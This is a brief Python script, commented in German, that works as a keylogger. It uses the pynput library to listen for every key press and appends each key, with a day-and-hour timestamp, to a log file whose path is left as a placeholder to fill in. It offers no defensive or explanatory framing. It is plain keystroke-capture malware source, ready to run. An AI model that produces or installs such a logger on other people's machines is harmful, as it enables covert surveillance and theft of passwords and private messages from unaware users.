import time
from pynput.keyboard import Listener, Key
 
def log(taste):
    t = time.localtime()
    tag = t.tm_mday
    stunde = t.tm_hour
    monat = t.tm_mon
    minute = t.tm_min
    name = str(tag) + "." + str(monat) + " - " + str(stunde) + ":" + str(minute)
    f = open(" #HIER PFAD EINFUEGEN ", "a+")
    f.write(name + " Inhalt: " + str(taste) + "\n")
 
with Listener(on_press=log) as listener:
    listener.join()